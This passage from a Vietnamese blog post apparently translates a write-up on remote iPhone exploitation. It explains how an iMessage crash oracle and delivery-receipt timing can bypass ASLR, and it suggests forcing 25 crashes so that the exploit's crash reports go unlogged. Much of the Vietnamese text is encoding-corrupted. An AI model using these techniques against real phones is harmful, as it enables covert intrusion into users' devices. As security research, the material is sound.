<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Best</span> <span class="p">(</span><span class="n">approximated</span><span class="p">)</span> <span class="n">address</span> <span class="n">to</span> <span class="n">probe</span> <span class="ow">is</span> <span class="mh">0x1c3d255f8</span> <span class="k">with</span> <span class="n">a</span> <span class="n">score</span> <span class="n">of</span> <span class="mf">1.00</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Shared</span> <span class="n">cache</span> <span class="ow">is</span> <span class="n">mapped</span> <span class="n">at</span> <span class="mh">0x1bf2b4000</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Gáº§n nhÆ° nhá»¯ng oracle function cÃ³ thá»ƒ Ä‘Æ°á»£c xÃ¢y dá»±ng ká»ƒ cáº£ tá»« cÃ¡c lá»— há»•ng bá»™ nhá»› khÃ¡c nhau. VÃ­ dá»¥ nhÆ° táº¥t cáº£ cÃ¡c lá»— há»•ng cho phÃ©p attacker lÃ m hÆ° háº¡i hoáº·c giáº£ máº¡o má»™t ObjC object (<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1881">CVE-2019â€“8641</a>, use-after-free <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1873">CVE-2019â€“8647</a> vÃ  <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1874">CVE-2019â€“8662</a>) cÅ©ng cÃ³ thá»ƒ sá»­ dá»¥ng Ä‘á»ƒ xÃ¢y dá»¥ng oracle function sau Ä‘Ã³ Ä‘Æ°a vÃ o á»©ng dá»¥ng nhÆ° trÃªn.</p>

<p><em>(Trans: Pháº§n nÃ y tÃ¡c giáº£ nÃ³i thÃªm vá» cÃ¡ch phÆ°Æ¡ng thá»©c objc_release hoáº¡t Ä‘á»™ng vÃ  cÃ¡ch construct oracle function)</em></p>

<p>Khi viá»‡c tham chiáº¿u Ä‘áº¿n má»™t ObjC object bá»‹ can thiá»‡p, method <a href="https://github.com/opensource-apple/objc4/blob/cd5e62a5597ea7a31dccef089317abb3a661c154/runtime/NSObject.mm#L1505">objc_release</a> sáº½ Ä‘Æ°á»£c gá»i vá»›i object trÃªn lÃ m tham biáº¿n, nÃ³ sáº½ kiá»ƒm tra xem object cÃ³ â€œphÆ°Æ¡ng thá»©c release Ä‘áº·c biá»‡tâ€ nÃ o khÃ´ng báº±ng cÃ¡ch kiá»ƒm tra má»™t bit trong Class object cá»§a object Ä‘Æ°á»£c tham chiáº¿u Ä‘Ã³ (Class tham chiáº¿u nÃ y Ä‘Æ°á»£c gá»i lÃ  â€œISAâ€ (Is-a) pointer). Náº¿u object khÃ´ng cÃ³ â€œphÆ°Æ¡ng thá»©c release Ä‘áº·c biá»‡t nÃ oâ€ thÃ¬ nÃ³ sáº½ giáº£m inline refcount (biáº¿n Ä‘áº¿m pháº§n tá»­) cá»§a object xuá»‘ng, náº¿u káº¿t quáº£ khÃ´ng báº±ng â€˜0â€™ -&gt; return. NgÆ°á»£c láº¡i thÃ¬ nÃ³ sáº½ gá»i destructor cá»§a object Ä‘Ã³ vÃ  memory chunk Ä‘Æ°á»£c giáº£i phÃ³ng.</p>

<pre><code class="language-objective-c">objc_release(id obj)
{
    if (!obj) return;
    if (obj-&gt;isTaggedPointer()) return;
    return obj-&gt;release();
}
</code></pre>

<p>Náº¿u Class pointer cá»§a má»™t object cÃ³ thá»ƒ Ä‘Æ°á»£c thay Ä‘á»•i Ä‘á»ƒ trá» vÃ o vÃ¹ng shared cache, vÃ  Ä‘á»“ng thá»i inline refcount &gt; 1, thÃ¬ objc_release chá»‰ crash náº¿u â€œbit Ä‘áº·c biá»‡tâ€ Ä‘Æ°á»£c set táº¡i má»™t offset tá»« con trá» Ä‘áº¿n giÃ¡ trá»‹. Báº±ng cÃ¡ch nÃ y, crash oracle cÃ³ thá»ƒ Ä‘Æ°á»£c reconstruct.</p>

<h2 id="há»—-trá»£-cÃ¡c-phiÃªn-báº£n-ios-vÃ -hardware-model-khÃ¡c-nhau">Há»— trá»£ cÃ¡c phiÃªn báº£n iOS vÃ  Hardware Model khÃ¡c nhau</h2>

<p>Attacker cÃ³ thá»ƒ build shared cache profile cho táº¥t cáº£ cÃ¡c hardware model vÃ  iOS version náº¿u khÃ´ng biáº¿t rÃµ vá» thÃ´ng tin trÃªn thiáº¿t bá»‹ cá»§a Ä‘á»‘i tÆ°á»£ng nháº¯m Ä‘áº¿n. Viá»‡c nÃ y cÃ³ thá»ƒ cho khoáº£ng vÃ i trÄƒm ngÃ n <code class="language-plaintext highlighter-rouge">base_address</code> nhÆ°ng nhá» vÃ o sá»± â€œkÃ¬ diá»‡uâ€ cá»§a thuáº­t toÃ¡n logarithm, ká»ƒ cáº£ khi sá»‘ lÆ°á»£ng lÃªn Ä‘áº¿n hÃ ng ngÃ n thÃ¬ attacker chá»‰ cáº§n gá»­i vÃ i chá»¥c tin nháº¯n Ä‘á»ƒ xÃ¡c Ä‘á»‹nh ra <code class="language-plaintext highlighter-rouge">base_address</code> cáº§n tÃ¬m vá»›i shared cache, model number, version má»™t cÃ¡ch chÃ­nh xÃ¡c.</p>

<h1 id="lÆ°u-Ã½-vá»-sá»±-á»“n-Ã o-noisiness-cá»§a-viá»‡c-exploit">LÆ°u Ã½ vá» sá»± á»“n Ã o (noisiness) cá»§a viá»‡c exploit</h1>

<p>Má»™t Ä‘iá»ƒm yáº¿u khÃ¡c cá»§a cÃ¡ch táº¥n cÃ´ng nÃ y lÃ  viá»‡c gÃ¢y chÃº Ã½ cá»§a nÃ³. Trong khi crash vÃ¹ng imagent máº¥y chá»¥c láº§n thÃ¬ ngÆ°á»i dá»¥ng cÅ©ng khÃ´ng biáº¿t gÃ¬, tuy nhiÃªn, thiáº¿t bá»‹ sáº½ gá»­i crash report cho Apple náº¿u option â€œShare iPhone Analyticsâ€ Ä‘Æ°á»£c báº­t. VÃ¬ váº­y, kÄ© thuáº­t nÃ y trá»Ÿ nÃªn khÃ´ng há»¯u dá»¥ng láº¯m, nhÆ°ng may máº¯n ráº±ng iOS sáº½ ngÆ°ng viá»‡c log láº¡i sau khi bá»‹ crash 25 láº§n</p>

<div class="language-verilog highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td> --><td class="rouge-code"><pre><span class="k">default</span> <span class="mi">14</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mf">42.957547</span> <span class="o">+</span><span class="mi">0200</span> <span class="n">ReportCrash</span> <span class="n">Formulating</span> <span class="n">report</span> <span class="k">for</span> <span class="n">corpse</span><span class="p">[</span><span class="mi">597</span><span class="p">]</span> <span class="n">imagent</span>
<span class="k">default</span> <span class="mi">14</span><span class="o">:</span><span class="mi">54</span><span class="o">:</span><span class="mf">42.977891</span> <span class="o">+</span><span class="mi">0200</span> <span class="n">ReportCrash</span> <span class="n">Report</span> <span class="n">of</span> <span class="k">type</span> <span class="mb">'10</span><span class="mi">9</span><span class="p">(</span><span class="o">&lt;</span><span class="n">private</span><span class="o">&gt;</span><span class="p">)</span><span class="err">'</span> <span class="kt">not</span> <span class="n">saved</span> <span class="n">because</span> <span class="n">the</span> <span class="n">limit</span> <span class="n">of</span> <span class="mi">25</span> <span class="n">logs</span> <span class="n">has</span> <span class="n">been</span> <span class="n">reached</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Ta cÃ³ thá»ƒ thá»­ DoS (VD nhÆ° thá»±c hiá»‡n Ä‘á»‡ quy nhiá»u láº§n dáº«n Ä‘áº¿n trÃ n bá»™ Ä‘á»‡m) Ä‘á»ƒ crash imagent 25 láº§n trÆ°á»›c khi thá»±c hiá»‡n exploit Ä‘á»ƒ khÃ´ng bá»‹ iOS log láº¡i. <em>Tuy nhiÃªn cÃ¡ch nÃ y váº«n chÆ°a Ä‘Æ°á»£c xÃ¡c thá»±c trong thá»±c táº¿</em>.</p>

<h1 id="váº¥n-Ä‘á»-vá»›i-automatic-delivery-receipts">Váº¥n Ä‘á» vá»›i Automatic Delivery Receipts</h1>

<p>NhÆ° Ä‘Ã£ trÃ¬nh bÃ y á»Ÿ trÃªn, viá»‡c bypass ASLR báº±ng cÃ¡ch táº¡o má»™t side channel Ä‘á»ƒ gá»­i tin nháº¯n tá»± Ä‘á»™ng tá»« thiáº¿t bá»‹ Ä‘áº¿n mÃ¡y chá»§ cá»§a ngÆ°á»i táº¥n cÃ´ng lÃ  kháº£ thi. Äá»ƒ vÃ¡ lá»—i nÃ y khÃ´ng chá»‰ Ä‘Æ¡n giáº£n nhÆ° kiá»ƒu: Gá»­i delivery receipt <strong>trÆ°á»›c</strong> khi parse báº¥t cá»© thá»© gÃ¬ phá»©c táº¡p, tá»« Ä‘Ã³ message váº«n Ä‘Æ°á»£c gá»­i Ä‘i máº·c ká»‡ viá»‡c payload cÃ³ lÃ m crash gÃ¬ Ä‘i ná»¯a. Tuy nhiÃªn. cÃ¡ch nÃ y khÃ´ng bao quÃ¡t Ä‘Æ°á»£c toÃ n bá»™, kiá»ƒu táº¥n cÃ´ng sau Ä‘Ã¢y váº«n cÃ³ thá»ƒ hoáº¡t Ä‘á»™ng nhÆ° thÆ°á»ng:</p>

<ol>
  <li>Gá»­i â€œoracleâ€ message (cÃ¡i mÃ  gÃ¢y crash) 2-3 láº§n liÃªn tiáº¿p</li>
  <li>Gá»­i má»™t tin nháº¯n â€œbÃ¬nh thÆ°á»ngâ€ (khÃ´ng gÃ¢y crash)</li>
  <li>Canh thá»i gian khi delivery receipt Ä‘Æ°á»£c gá»­i tá»›i. Náº¿u nÃ³ lÃ¢u hÆ¡n má»™t vÃ i giÃ¢y thÃ¬ cháº¯c háº³n vÃ¹ng <code class="language-plaintext highlighter-rouge">imagent</code> Ä‘Ã£ crash tá»« bÆ°á»›c 1 vÃ  viá»‡c gá»­i bá»‹ delay bá»Ÿi launchd</li>
</ol>

<p>CÃ¡ch táº¥n cÃ´ng nÃ y Ä‘Ã£ Ã©p buá»™c launchd pháº£i restart vÃ  delay. PhÆ°Æ¡ng thá»©c nÃ y cÅ©ng cÃ³ thá»ƒ tá»“n táº¡i trÃªn má»™t sá»‘ platform khÃ¡c. ChÃ­nh vÃ¬ tháº¿, ta hiá»ƒu Ä‘Æ°á»£c ráº±ng báº¥t kÃ¬ tin nháº¯n tá»± Ä‘á»™ng nÃ o Ä‘Æ°á»£c gá»­i tá»« phÃ­a victim thÃ¬ luÃ´n cÃ³ thá»ƒ bá»‹ khai thÃ¡c nhÆ° cÃ¡ch trÃªn. CÃ¡ch giáº£i quyáº¿t tá»‘t nháº¥t bÃ¢y giá» lÃ  khÃ´ng cho báº¥t kÃ¬ tin nháº¯n nÃ o Ä‘Æ°á»£c gá»­i má»™t cÃ¡ch tá»± Ä‘á»™ng cáº£, hoáº·c Ã­t nháº¥t pháº£i cÃ³ tÃ¡c Ä‘á»™ng cá»§a ngÆ°á»i dÃ¹ng.</p>

<p>Pháº§n hai cá»§a series <em>Remote iPhone Exploitation</em> sáº½ káº¿t thÃºc táº¡i Ä‘Ã¢y. Háº¹n gáº·p cÃ¡c báº¡n á»Ÿ pháº§n tiáº¿p theo.</p>
:ET